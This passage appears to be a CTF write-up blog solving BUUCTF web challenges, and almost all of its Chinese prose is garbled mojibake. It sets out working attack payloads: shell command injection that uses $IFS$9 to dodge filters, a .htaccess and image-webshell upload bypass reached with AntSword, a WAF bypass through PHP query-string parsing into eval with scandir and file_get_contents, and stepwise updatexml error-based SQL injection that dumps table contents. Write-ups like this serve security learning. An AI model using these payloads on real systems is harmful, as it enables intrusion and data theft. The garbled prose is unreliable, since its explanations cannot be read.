<p><img src="/post/wp-buuctf/image-20220706233818795.png" alt="image-20220706233818795"></p>
<p>æ„æ€æ˜¯ç¬¦å·éƒ½è¿‡æ»¤äº†</p>
<p>è¿™é‡Œå¼•å…¥æˆ‘ä¸€ä¸ªæ–°å­¦çš„ç©ºæ ¼ä»£æ›¿ç¬¦$IFS$9ï¼Œè¿™æ˜¯ä¸ªshellä¸­å®šä¹‰çš„ç¯å¢ƒå˜é‡ï¼Œåœ¨æ­¤å¤„å¯ä»¥ç»•è¿‡è¿‡æ»¤</p>
<p>$IFS$9ï¼ˆ$IFSæ˜¯<strong>Unix</strong>ç³»ç»Ÿçš„ä¸€ä¸ªé¢„è®¾å˜é‡è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œ$9åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼‰</p>
<p>è¯•è¯•</p>
<p><code>?ip=123.123.123.123;cat$IFS$9flag.php</code></p>
<p><img src="/post/wp-buuctf/image-20220706234926216.png" alt="image-20220706234926216"></p>
<p>å‘ç°flagä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œé‚£å°±åªå¥½å…ˆçœ‹çœ‹index.phpæ–‡ä»¶ï¼Œè¯•è¯•èƒ½ä¸èƒ½çœ‹åˆ°å…¶ä»£ç </p>
<p><code>?ip=123.123.123.123;cat$IFS$9index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°ipæœ‰å¾ˆå¤šæ­£åˆ™åŒ¹é…çš„å­—ç¬¦ï¼Œæ‰€ä»¥æ²¡æœ‰é‚£ä¹ˆå®¹æ˜“ç»•è¿‡</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">shell_exec </span>â€” é€šè¿‡ <span class="keyword">shell </span>ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚</span><br><span class="line"><span class="keyword">shell_exec(string </span>$cmd): string</span><br><span class="line">exec æ˜¯ <span class="keyword">Shell </span>å†…ç½®å‘½ä»¤ï¼Œå®ƒæœ‰ä¸¤ç§ç”¨æ³•ï¼Œä¸€ç§æ˜¯æ‰§è¡Œ <span class="keyword">Shell </span>å‘½ä»¤ï¼Œä¸€ç§æ˜¯æ“ä½œæ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">ping -c <span class="built_in">Count</span> æŒ‡å®šè¦è¢«å‘é€ï¼ˆæˆ–æ¥æ”¶ï¼‰çš„å›é€ä¿¡å·è¯·æ±‚çš„æ•°ç›®ï¼Œç”± <span class="built_in">Count</span> å˜é‡æŒ‡å‡º</span><br><span class="line">--(æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªèƒ½è¾“å…¥å››ä¸ªå­—ç¬¦)--</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_rå‡½æ•°ç”¨äºæ‰“å°å˜é‡ï¼Œä»¥æ›´å®¹æ˜“ç†è§£çš„å½¢å¼å±•ç¤º</span><br><span class="line"></span><br><span class="line">ä¾‹å­</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span> (<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;c&#x27;</span> =&gt; <span class="keyword">array</span> (<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>)); </span><br><span class="line"><span class="title function_ invoke__">print_r</span> (<span class="variable">$a</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¾“å‡ºç»“æœ</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [a] =&gt; apple</span><br><span class="line">    [b] =&gt; banana</span><br><span class="line">    [c] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; x</span><br><span class="line">            [<span class="number">1</span>] =&gt; y</span><br><span class="line">            [<span class="number">2</span>] =&gt; z</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>flagè¿‡æ»¤è¯­å¥çš„æ„æ€åˆ¤æ–­æ˜¯å¦æŒ‰é¡ºåºå‡ºç°flag</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="built_in">if</span>(<span class="built_in">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªè¦ipé‡Œçš„flagå‡ºç°ä¸æŒ‰é¡ºåºå°±è¡Œï¼Œä¹Ÿå°±æ˜¯flagå¦ä¸€ç§æ–¹å¼è¡¨ç¤º</p>
<p>æˆ‘ä»¬çœ‹æºç çŸ¥é“æœ‰ä¸¤ä¸ªå˜é‡ï¼Œä¸€ä¸ªæ˜¯$ip,$a</p>
<p>ipå˜é‡æ— æ³•æ”¹å˜ï¼Œå˜é‡aå¯ä»¥å°è¯•èµ‹å€¼flagè¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œä½†æ˜¯å¦‚æœæ˜¯a&#x3D;flagï¼Œå°±ä¼šé¡ºåºå‡ºç°flagï¼ŒåŒ¹é…ï¼Œæ‰€ä»¥è¯•è¯•a&#x3D;gï¼Œflagâ€“&gt;fla$a</p>
<p><code>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
<p>æŸ¥çœ‹æºç </p>
<p>å¾—åˆ°flag</p>
<h2 id="3-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#3-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="3.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>3.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><h3 id="1-é¢˜ç›®æè¿°-1"><a href="#1-é¢˜ç›®æè¿°-1" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p> çœ‹æ ‡é¢˜çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ï¼Œè¦æ±‚ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬</p>
<p><img src="/post/wp-buuctf/image-20220710111959632.png" alt="image-20220710111959632"></p>
<p>æ‰“å¼€å…ˆçœ‹åˆ°ä¸€ä¸ªå°¸ä½“åœ¨åœ¨ç¬‘ï¼Œæˆ‘ä»¬å…ˆè¯•è¯•èƒ½ä¸èƒ½ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶</p>
<p><img src="/post/wp-buuctf/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>çœ‹æ¥ä¸è¡Œï¼Œé‚£åœ¨è¯•è¯•èƒ½ä¸èƒ½æŠ“åŒ…ä¿®æ”¹å‰ç«¯æ–‡ä»¶åç¼€åï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯å‰ç«¯éªŒè¯ï¼ŒæŠŠphpæ”¹æˆpngï¼Œåœ¨æŠ“åŒ…ä¿®æ”¹åç¼€ä¸ºphp</p>
<p><img src="/post/wp-buuctf/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>è¿˜æ˜¯ä¸€æ ·ï¼Œè¿˜æœ‰ä¸€ä¸ªçŒœæƒ³å°±æ˜¯MIMEéªŒè¯ï¼Œå¯¹content-typeè¿›è¡Œäº†æ£€æŸ¥ï¼Œå¯ä»¥è¯•è¯•ä½¿ç”¨bp<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">æŠ“åŒ…</a>ï¼Œä¿®æ”¹ä¸Šä¼ çš„PHPçš„content-typeä¸ºimage&#x2F;pngï¼Œä½†æ˜¯è¿˜æ˜¯ä¸€æ ·çš„</p>
<p><img src="/post/wp-buuctf/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>äºæ˜¯ï¼Œå¯ä»¥ç”¨.htaccesså®ç°å›¾ç‰‡é©¬ä»¥phpæ–‡ä»¶å½¢å¼è¯»å–ï¼ˆå¦‚æœä¸äº†è§£å¯ä»¥æŠŠ.htaccessæ–‡ä»¶äº†è§£ä¸€ä¸‹ï¼ŒæŠŠçº¿ä¸‹é¶åœºupload-labsåšä¸€ä¸‹ï¼‰</p>
<p>ä½†æ˜¯ä¸Šä¼ æ—¶ï¼Œåˆè¢«è¿‡æ»¤äº†</p>
<p><img src="/post/wp-buuctf/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>å°è¯•ä¿®æ”¹æ–‡ä»¶åä¸º.htaccess.pngï¼Œç„¶åç”¨bpæŠ“åŒ…ä¿®æ”¹å›.htaccessï¼Œä¸Šä¼ æˆåŠŸ</p>
<p><img src="/post/wp-buuctf/image-20220710114410888.png" alt="image-20220710114410888"></p>
<p><img src="/post/wp-buuctf/image-20220710114422488.png" alt="image-20220710114422488"></p>
<p>ç„¶åä¸Šä¼ å›¾ç‰‡æœ¨é©¬</p>
<p><img src="/post/wp-buuctf/image-20220710114444539.png" alt="image-20220710114444539"></p>
<p>æŠŠè·¯å¾„å¤åˆ¶ä¸€ä¸‹</p>
<p><code>http://424ad9a4-20e6-4394-8150-06fc204ba3e0.node4.buuoj.cn:81/upload/9d0fb395a11b49196f664cfa8fe0200a/1.png</code></p>
<p><img src="/post/wp-buuctf/image-20220710114617412.png" alt="image-20220710114617412"></p>
<p>èšå‰‘è¿æ¥æˆåŠŸ</p>
<p><img src="/post/wp-buuctf/image-20220710114647722.png" alt="image-20220710114647722"></p>
<p>åœ¨æ ¹ç›®å½•å‘ç°flag</p>
<p>å¾—åˆ°flag</p>
<h2 id="4-RoarCTF-2019-Easy-Calc"><a href="#4-RoarCTF-2019-Easy-Calc" class="headerlink" title="4.[RoarCTF 2019]Easy Calc"></a>4.[RoarCTF 2019]Easy Calc</h2><h3 id="1-é¢˜ç›®æè¿°-2"><a href="#1-é¢˜ç›®æè¿°-2" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿˜æ˜¯å¾—çœ‹å¤§ä½¬å¾—wpæ‰ä¼š</p>
<p><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714">åŸæ–‡é“¾æ¥</a></p>
<p>è¿™æ˜¯calc.phpçš„å†…å®¹ï¼ŒæŸ¥çœ‹æºç å°±å¯ä»¥çœ‹åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>wafä¸»è¦å°±æ˜¯çœ‹æœ‰æ²¡æœ‰éæ•°å­—å­˜åœ¨ï¼Œç»•è¿‡wafå°±å¥½æ“ä½œäº†</p>
<hr>
<p>1.1PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</p>
<p>è¿™æ˜¯åˆ«äººå¯¹PHPå­—ç¬¦ä¸²è§£ææ¼æ´çš„ç†è§£ï¼Œ<br>æˆ‘ä»¬çŸ¥é“PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚</p>
<p>ä¾‹å¦‚ï¼š&#x2F;?foo&#x3D;barå˜æˆArray([foo] &#x3D;&gt; â€œbarâ€)ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚</p>
<p>ä¾‹å¦‚ï¼Œ&#x2F;?%20news[id%00&#x3D;42ä¼šè½¬æ¢ä¸ºArray([news_id] &#x3D;&gt; 42)ã€‚</p>
<p>å¦‚æœä¸€ä¸ªIDS&#x2F;IPSæˆ–WAFä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“news_idå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">new</span><span class="type">s</span>.php?%<span class="number">20</span><span class="keyword">new</span><span class="type">s</span>[id%<span class="number">00</span>=<span class="number">42</span><span class="string">&quot;+AND+1=0â€“</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°PHPè¯­å¥çš„å‚æ•°%20news[id%00çš„å€¼å°†å­˜å‚¨åˆ°$_GET[â€œnews_idâ€]ä¸­ã€‚</p>
<p><u><strong>PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</strong></u></p>
<pre><code>1.åˆ é™¤ç©ºç™½ç¬¦

2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰
</code></pre>
<p>æˆ‘çš„ç†è§£ï¼š<br>å‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼š</p>
<pre><code>http://www.xxx.com/index.php?num = aaaa   //æ˜¾ç¤ºéæ³•è¾“å…¥çš„è¯
</code></pre>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼š</p>
<pre><code>http://www.xxx.com/index.php? num = aaaa
</code></pre>
<p>è¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œï¼ˆç©ºæ ¼ï¼‰numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚</p>
<p>ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼š<u>å…ˆæŠŠç©ºæ ¼ç»™å»æ‰</u>ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</p>
<hr>
<p>var_dump() </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">åˆ—ä¸¾æ•°ç»„å†…å®¹</span><br></pre></td></tr></table></figure>

<p>scandir() çš„ä½¿ç”¨ï¼š</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">scandir(<span class="built_in">directory</span>,sorting_order,<span class="built_in">context</span>);</span><br><span class="line"></span><br><span class="line"> è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„,å°±æ˜¯æ˜¾ç¤ºæ–‡ä»¶å¤¹åå­—</span><br></pre></td></tr></table></figure>

<p>file_get_contents() çš„ä½¿ç”¨ï¼š</p>
<pre><code>åŸå‹ï¼šfile_get_contents(path,include_path,context,start,max_length)
file_get_contents() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚
å’Œ file() ä¸€æ ·ï¼Œä¸åŒçš„æ˜¯ file_get_contents() æŠŠæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚
file_get_contents() å‡½æ•°æ˜¯ç”¨äºå°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚
å°±æ˜¯æ˜¾ç¤ºæ–‡ä»¶å†…å®¹
</code></pre>
<hr>
<p>chr(47)æ˜¯<code>/</code>çš„ASCIIç¼–ç ï¼›ã€<code>/</code>å°±æ˜¯æ ¹ç›®å½•ï¼Œå¯ä»¥å…ˆè®¿é—®ä¸€ä¸‹æ ¹ç›®å½•ï¼Œæ‰¾æ‰¾å¤§æ¦‚flagåœ¨å“ªé‡Œã€‘</p>
<p>chr(102)æ˜¯<code>f</code>çš„ASCIIç¼–ç ï¼›</p>
<p>chr(49)æ˜¯<code>1</code>çš„ASCIIç¼–ç ï¼›</p>
<p>chr(97)æ˜¯<code>a</code>çš„ASCIIç¼–ç ï¼›</p>
<p>chr(103)æ˜¯<code>g</code>çš„ASCIIç¼–ç ã€‚</p>
<p>ã€å­—ç¬¦é—´ç”¨<code>.</code>è¿æ¥ï¼Œå¦‚<code>flag</code>-&gt;<code>chr(102).chr(49).chr(97).chr(103)</code>ã€‘</p>
<p>æ ¹æ®phpè§£æå­—ç¬¦ä¸²çš„ç‰¹æ€§</p>
<p>å…ˆè¯•è¯•è¿”å›çœ‹çœ‹æ ¹ç›®å½•ï¼ˆ&#x2F;ï¼‰ä¸‹çš„æ–‡ä»¶æœ‰å“ªäº›</p>
<p><code>http://node4.buuoj.cn:29105/calc.php?num=var_dump(scandir(chr(47)))</code></p>
<p><img src="/post/wp-buuctf/image-20220819232248275.png" alt="image-20220819232248275"></p>
<p>çœ‹åˆ°æœ‰ä¸ª<code>flagg</code></p>
<p>è¿”å›çœ‹çœ‹<code>/flagg</code>é‡Œçš„å†…å®¹</p>
<p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p><img src="/post/wp-buuctf/image-20220819234552921.png" alt="image-20220819234552921"></p>
<h2 id="5-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#5-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="5.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>5.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><h3 id="1-é¢˜ç›®æè¿°-3"><a href="#1-é¢˜ç›®æè¿°-3" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åå­—ï¼ŒçŒœæµ‹è¿™ä¸ªsqlæ³¨å…¥è¿‡æ»¤å¾ˆä¸¥</p>
<p><img src="/post/wp-buuctf/image-20220821144626428.png" alt="image-20220821144626428"></p>
<p>å…ˆè¯•è¯•fuzzæµ‹è¯•ï¼Œçœ‹çœ‹è¿‡æ»¤äº†å“ªäº›ï¼Œå‘ç°unionè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨è”åˆæ³¨å…¥</p>
<p><img src="/post/wp-buuctf/image-20220821144002573.png" alt="image-20220821144002573"></p>
<p>ä½†æ˜¯å‘ç°updatexmlæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥è¯•è¯•æŠ¥é”™æ³¨å…¥</p>
<p><img src="/post/wp-buuctf/image-20220821145036408.png" alt="image-20220821145036408"></p>
<p>å…ˆæ„é€ payload</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span><span class="meta">&amp;password=1&#x27;or updatexml(1,concat(0x7e,database(),0x7e),1)%23</span></span><br><span class="line">ã€è¿™é‡Œ+è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œç”¨<span class="meta">#ã€‘</span></span><br></pre></td></tr></table></figure>

<p>ç»“æœå‘ç°ç»“æœåˆè¢«è¿‡æ»¤äº†ï¼Œåé¢ç”¨fuzzåˆæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œç”¨%0aå’Œå…¶ä»–ç¬¦å·ä¹Ÿä¸èƒ½æ›¿æ¢ï¼Œæ‰€ä»¥åªèƒ½è¯•è¯•()æŠŠç»“æœæ¡†èµ·æ¥è¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">1</span>&#x27;or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">%23</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ•°æ®åº“å</p>
<p><img src="/post/wp-buuctf/image-20220821172827984.png" alt="image-20220821172827984"></p>
<p>åé¢å°±æ˜¯å·®ä¸å¤šäº†ï¼Œä½†æ˜¯è¦æ³¨æ„ä¸èƒ½ç”¨ç©ºæ ¼ï¼Œè¦ç”¨()æ¡†ä½å¯¹è±¡</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;geek&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br><span class="line">ã€è¿™é‡Œçš„=ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ç”¨<span class="keyword">like</span>æ›¿æ¢ã€‘</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¡¨å</p>
<p><img src="/post/wp-buuctf/image-20220821173920231.png" alt="image-20220821173920231"></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">&#x27;H4rDsq1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°åˆ—å</p>
<p><img src="/post/wp-buuctf/image-20220821174239954.png" alt="image-20220821174239954"></p>
<p>ç„¶åçœ‹çœ‹åˆ—é‡Œæ•°æ®æ‰¾æ‰¾flag</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(id,username,<span class="keyword">password</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>çœ‹å›æ˜¾çŸ¥é“flagåœ¨passwordé‡Œï¼Œä½†ä¸ºä»€ä¹ˆæ˜¾ç¤ºä¸å…¨ï¼Œ<strong>æ˜¯å› ä¸ºupdatexmlæŠ¥é”™å›æ˜¾çš„æ•°æ®é™åˆ¶æœ€å¤š32ä½ï¼Œæ‰€ä»¥æ— æ³•æ˜¾ç¤ºå…¨flag</strong></p>
<p><img src="/post/wp-buuctf/image-20220821174509553.png" alt="image-20220821174509553"></p>
<p>æ‰€ä»¥å¯ä»¥ç”¨leftå’Œrightå‡½æ•°è¿›è¡Œåˆ†æ®µæ˜¾ç¤ºï¼Œæœ¬æ¥æƒ³ç”¨stustrå‡½æ•°ï¼Œä½†æ˜¯å‘ç°ä¹Ÿè¢«è¿‡æ»¤äº†</p>
